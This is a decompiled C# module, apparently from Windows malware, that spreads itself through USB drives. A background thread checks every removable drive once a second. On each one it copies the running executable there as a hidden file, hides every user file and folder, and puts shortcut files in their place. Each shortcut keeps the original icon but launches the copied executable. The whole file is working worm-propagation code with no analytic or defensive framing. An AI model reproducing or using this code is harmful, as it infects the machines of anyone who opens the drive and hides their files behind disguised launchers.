using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication35;

[StandardModule]
public sealed class USB
{
	public static string ExeName;

	private static Thread H;

	public static void Enable()
	{
		H = new Thread(WorkThread);
		H.Start();
	}

	public static void Disable()
	{
		H.Abort();
	}

	public static void WorkThread()
	{
		while (true)
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				if (!driveInfo.IsReady || driveInfo.DriveType != DriveType.Removable)
				{
					continue;
				}
				string text = driveInfo.RootDirectory.ToString();
				try
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, text + ExeName);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				File.SetAttributes(text + ExeName, FileAttributes.Hidden);
				string[] files = Directory.GetFiles(text);
				foreach (string text2 in files)
				{
					if (Operators.CompareString(Path.GetFileNameWithoutExtension(text2), Path.GetFileNameWithoutExtension(ExeName), false) != 0)
					{
						if (!text2.Contains(".lnk"))
						{
							File.SetAttributes(text2, FileAttributes.Hidden);
						}
						object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { text + Path.GetFileNameWithoutExtension(text2) + ".lnk" }, (string[])null, (Type[])null, (bool[])null));
						NewLateBinding.LateSet(objectValue2, (Type)null, "TargetPath", new object[1] { text + ExeName }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(objectValue2, (Type)null, "WorkingDirectory", new object[1] { text }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(objectValue2, (Type)null, "IconLocation", new object[1] { text2 + ", 0" }, (string[])null, (Type[])null);
						NewLateBinding.LateCall(objectValue2, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
				}
				string[] directories = Directory.GetDirectories(text);
				foreach (string text3 in directories)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(text3);
					directoryInfo.Attributes = FileAttributes.Hidden;
					object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "CreateShortcut", new object[1] { text3 + ".lnk" }, (string[])null, (Type[])null, (bool[])null));
					NewLateBinding.LateSet(objectValue2, (Type)null, "TargetPath", new object[1] { text + ExeName }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue2, (Type)null, "WorkingDirectory", new object[1] { text }, (string[])null, (Type[])null);
					NewLateBinding.LateSet(objectValue2, (Type)null, "IconLocation", new object[1] { Environment.GetEnvironmentVariable("windir") + "\\System32\\Shell32.dll, 3" }, (string[])null, (Type[])null);
					NewLateBinding.LateCall(objectValue2, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
				}
			}
			Thread.Sleep(1000);
		}
	}
}
